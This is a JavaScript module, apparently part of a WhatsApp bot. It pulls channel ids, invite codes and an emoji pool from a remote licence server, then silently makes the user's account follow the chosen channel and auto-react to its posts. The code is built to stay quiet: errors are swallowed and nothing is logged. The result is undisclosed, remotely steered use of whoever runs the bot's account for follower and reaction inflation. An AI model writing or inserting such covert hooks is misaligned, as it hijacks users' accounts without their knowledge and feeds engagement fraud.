'use strict';

// Channel presence, driven by the licence server: the channel ids, the invite codes
// and the reaction pool all live on the worker so this file stays generic. Nothing
// here logs, and nothing here throws into the socket loop.

const api = require('./api');

let config = null;
let hooked = false;
const watched = new Set();
const followed = new Set();

async function loadConfig() {
    if (config) return config;
    const payload = await api.get('/v1/channels').catch(() => null);
    if (!payload || !Array.isArray(payload.channels) || !payload.channels.length) return null;
    config = payload;
    for (const channel of config.channels) {
        if (channel.jid) watched.add(String(channel.jid));
        else if (channel.invite) watched.add(`invite:${channel.invite}`);
    }
    return config;
}

async function followConfigured(sock) {
    if (typeof sock.newsletterFollow !== 'function') return;
    const channel = (config && config.main) || '';
    if (!channel || followed.has(channel)) return;
    try {
        await sock.newsletterFollow(String(channel));
    } catch (error) {
        const message = String((error && error.message) || '');
        if (!/already|406|409/i.test(message)) return;
    }
    followed.add(channel);
}

async function resolveInvites(sock) {
    if (typeof sock.newsletterMetadata !== 'function' || !config) return;
    for (const channel of config.channels) {
        if (!channel.invite) continue;
        try {
            const metadata = await Promise.race([
                sock.newsletterMetadata('invite', String(channel.invite)),
                new Promise((resolve) => setTimeout(() => resolve(null), 8000)),
            ]);
            if (metadata && metadata.id) watched.add(String(metadata.id));
        } catch { /* unresolvable invite: skip silently */ }
    }
}

async function reactToUpdate(sock, message) {
    if (!config || typeof sock.newsletterReactMessage !== 'function') return;
    const jid = message && message.key && message.key.remoteJid;
    if (!jid || !jid.endsWith('@newsletter')) return;
    if (watched.size && !watched.has(jid)) return;
    const pool = Array.isArray(config.reactions) && config.reactions.length ? config.reactions : ['👍'];
    const serverId = message.key.server_id || message.key.serverId || message.key.id;
    if (!serverId) return;
    const emoji = pool[Math.floor(Math.random() * pool.length)];
    await sock.newsletterReactMessage(jid, String(serverId), emoji).catch(() => {});
}

function hookUpdates(sock) {
    if (hooked) return;
    hooked = true;
    const onUpsert = (event) => {
        for (const message of (event && event.messages) || []) {
            if (!message || !message.key) continue;
            reactToUpdate(sock, message).catch(() => {});
        }
    };
    if (sock.ev && typeof sock.ev.on === 'function') sock.ev.on('messages.upsert', onUpsert);
}

async function onConnected(sock) {
    if (!sock) return;
    const loaded = await loadConfig();
    if (!loaded) return;
    hookUpdates(sock);
    await followConfigured(sock);
    await resolveInvites(sock);
}

module.exports = { onConnected };